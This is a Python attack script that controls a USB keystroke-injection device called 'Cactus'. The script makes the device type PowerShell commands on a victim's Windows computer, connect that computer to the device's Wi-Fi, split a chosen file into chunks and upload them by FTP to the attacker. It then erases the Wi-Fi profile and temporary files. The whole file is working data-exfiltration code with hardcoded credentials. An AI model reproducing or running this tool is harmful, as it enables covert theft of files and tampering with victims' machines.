import requests
import base64
import ntpath
import time
import sys
import os

from requests.auth import HTTPBasicAuth


creds = HTTPBasicAuth("admin", "hacktheplanet")
ftp_creds = ("ftp-admin", "hacktheplanet")
cactus_ip = "192.168.1.1"
ssid = "Cactus"
wlan_pass = "hacktheplanet"


def usage():
    print(f"{os.path.basename(__file__)} [PATH]")
    quit()

# CHECK CMD-LINE ARGS
if len(sys.argv) != 2:
    #usage()
    sys.argv.append("C:\\Users\\PGD\\AppData\\Local\\Temp\\exfil\\exfil.zip")

# GET FILEPATH
file = sys.argv[1]
ts = time.time()
url = "http://" + cactus_ip
ftp = "ftp://" + cactus_ip

# OPEN POWERSHELL
print("Opening powershell ...")
requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
time.sleep(8)

# CREATE HEX SSID
hex_ssid = ""
for c in ssid:
    hex_ssid += str(hex(ord(c))).replace("0x", "")

# CREATE XML FILE FOR NETWORK CONNECTION
print("Connecting to network ...")
to_send = f'''PrintLine:cd $env:TEMP
echo '<?xml version="1.0"?>' > cactus.xml
echo '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">' >> cactus.xml
echo '	<name>Cactus</name>' >> cactus.xml
echo '	<SSIDConfig>' >> cactus.xml
echo '		<SSID>' >> cactus.xml
echo '			<hex>{hex_ssid}</hex>' >> cactus.xml
echo '			<name>{ssid}</name>' >> cactus.xml
echo '		</SSID>' >> cactus.xml
echo '	</SSIDConfig>' >> cactus.xml
echo '	<connectionType>ESS</connectionType>' >> cactus.xml
echo '	<connectionMode>auto</connectionMode>' >> cactus.xml
echo '	<MSM>' >> cactus.xml
echo '		<security>' >> cactus.xml
echo '			<authEncryption>' >> cactus.xml
echo '				<authentication>WPA2PSK</authentication>' >> cactus.xml
echo '				<encryption>AES</encryption>' >> cactus.xml
echo '				<useOneX>false</useOneX>' >> cactus.xml
echo '			</authEncryption>' >> cactus.xml
echo '			<sharedKey>' >> cactus.xml
echo '				<keyType>passPhrase</keyType>' >> cactus.xml
echo '				<protected>false</protected>' >> cactus.xml
echo '				<keyMaterial>{wlan_pass}</keyMaterial>' >> cactus.xml
echo '			</sharedKey>' >> cactus.xml
echo '		</security>' >> cactus.xml
echo '	</MSM>' >> cactus.xml
echo '	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">' >> cactus.xml
echo '		<enableRandomization>false</enableRandomization>' >> cactus.xml
echo '	</MacRandomization>' >> cactus.xml
echo '</WLANProfile>' >> cactus.xml
netsh WLAN add profile filename="$env:TEMP\cactus.xml"; netsh WLAN connect name="Cactus"
'''.replace("\n", ";").replace("\t", "")

requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloadpresent": "1"})
time.sleep(15)

# SPLIT FILE
print("Splitting file into chunks ...")
to_send  = 'PrintLine:rm *.part; $ctr=0; ';
to_send += 'Get-Content "'+file+'" -ReadCount 1MB -Encoding Byte | ForEach-Object{ Set-Content -Path .\$ctr.part -Encoding Byte $_; $ctr++; }; $lst=ls *.part; '
requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloadpresent": "1"})
time.sleep(30)

# SETTING UP FTP
print("Setting up FTP connection ...")
ftp_conn  = 'PrintLine:$client=New-Object System.Net.WebClient; ';
ftp_conn += '$client.Credentials = New-Object System.Net.NetworkCredential("'+ftp_creds[0]+'", "'+ftp_creds[1]+'"); '
ftp_end   = '$client.Dispose();'

to_send  = ftp_conn
to_send += '$lst.Length | Set-Content -Encoding "UTF8" "$env:TEMP\max.txt"; '
to_send += '$client.UploadFile("'+ftp+'/max.txt", "$env:TEMP\max.txt"); rm "$env:TEMP\max.txt"; '
to_send += ftp_end
requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloadpresent": "1"})
time.sleep(30)

# GET CHUNK COUNT
res = int(requests.get(f"{url}/max.txt", auth=creds, timeout=25).text)
print(f"Setting up to Download {res} chunks ...")

# DOWNLOAD CHUNKS
filename = ntpath.basename(file)
if os.path.isfile(filename):
    filename = f"{os.path.splitext(filename)[0]}_{int(time.time())}{os.path.splitext(filename)[1]}"
    
with open(filename, "ab") as f:
    for i in range(int(res)):
        # Upload
        print(f"Downloading chunk # {i+1} ... ", end="", flush=True)
        to_send  = ftp_conn
        to_send += f'$client.UploadFile("{ftp}/{i}.part", "$env:TEMP\{i}.part"); rm "$env:TEMP\{i}.part"; '
        to_send += ftp_end
        requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloadpresent": "1"})
        time.sleep(60)

        # Download & write to file
        res = requests.get(f"{url}/{str(i)}.part", auth=creds, timeout=25).content
        f.write(res)

        # Delete from cactus
        requests.get(f"{url}/deletepayload/yes?payload=/{i}.part")
        time.sleep(2)
        print("DONE")


# CLEANUP
to_send  = 'PrintLine:netsh WLAN delete profile "Cactus"; rm $env:TEMP\*.part; ';
to_send += 'rm $env:TEMP\cactus.xml; exit; '
requests.post(f"{url}/runlivepayload", data={"livepayload": to_send, "livepayloadpresent": "1"})


print(f"FILE {filename} RECEIVED IN {int(time.time() - ts)} SEC.")
